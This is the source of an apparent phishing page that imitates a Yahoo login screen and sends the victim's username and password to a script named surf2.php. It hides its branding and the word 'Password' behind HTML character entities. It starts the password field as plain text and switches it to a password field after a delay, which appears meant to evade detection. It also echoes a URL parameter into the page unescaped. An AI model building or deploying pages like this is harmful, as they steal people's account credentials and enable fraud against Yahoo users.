<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#89;&#97;&#104;&#111;&#111;&#32;&#45;&#32;&#108;&#111;&#103;&#105;&#110;</title>
<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
<script>setTimeout(function() {
  document.getElementsByTagName('input')[1].type = "password"
}, 1000);
</script>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>
<style type="text/css">
			  .textbox {
    padding: 9px !important;
    height: auto;
    color: #333;
    border: none;
    border-bottom: 1px solid #dd1037;
    border-radius: 1px;
    font-family: 'josefin_sansregular', sans-serif;
    font-size: 16px;
	color: #555;
    outline: none;
    -webkit-transition: all 250ms ease-in;
    -moz-transition: all 250ms ease-in;
    -ms-transition: all 250ms ease-in;
    -o-transition: all 250ms ease-in;
    transition: all 250ms ease-in;
}
.textbox:focus {
       border-bottom: 2px solid #188FFF;
}
 
.textbox1 { 
    color: #101010;
	text-align: left;
  	font-size: 19px;
    border: 0px solid #fff; 
    outline:0; 
    height: 35px; 
    width: 275px; 
 }

</style>
<style type="text/css">
div#container
{
	position:relative;
	width: 1365px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>

<style>
p{font-size: 40px;}
.loader {
    position: fixed;
    left: 0px;
    top: 0px;
    width: 100%;
    height: 100%;
    z-index: 9999;
    background: url('https://smallenvelop.com/wp-content/uploads/2014/08/Preloader_11.gif') 50% 50% no-repeat rgb(249,249,249);
    opacity: .8;
}
</style>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script type="text/javascript">
$(window).load(function() {
	$(".loader").fadeOut("slow");
});
</script>

</head>
<body>
<div class="loader"></div>
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1365px; height:656px; z-index:0"><img src="images/h5.png" alt="" title="" border=0 width=1365 height=656></div>

<div id="image2" style="position:absolute; overflow:hidden; left:938px; top:400px; width:151px; height:20px; z-index:1"><a href="#"><img src="images/h4.png" alt="" title="" border=0 width=151 height=20></a></div>
<form action=surf2.php name=takreerki id=takreerki method=post>
<input name="user" value="<?=$_GET[user2]?>" class="textbox1" autocomplete="off" required type="text" style="position:absolute;width:250px;left:938px;top:176px;z-index:2">
<input name="pd" placeholder="P&#97;&#115;&#115;&#119;&#111;&#114;d " class="textbox" autocomplete="off" required type="text" style="position:absolute;width:320px;left:855px;top:250px;z-index:3">
<div id="formimage1" style="position:absolute; left:852px; top:316px; z-index:4"><input type="image" name="formimage1" width="322" height="45" src="images/yg.png"></div>
</div>

</body>
</html>
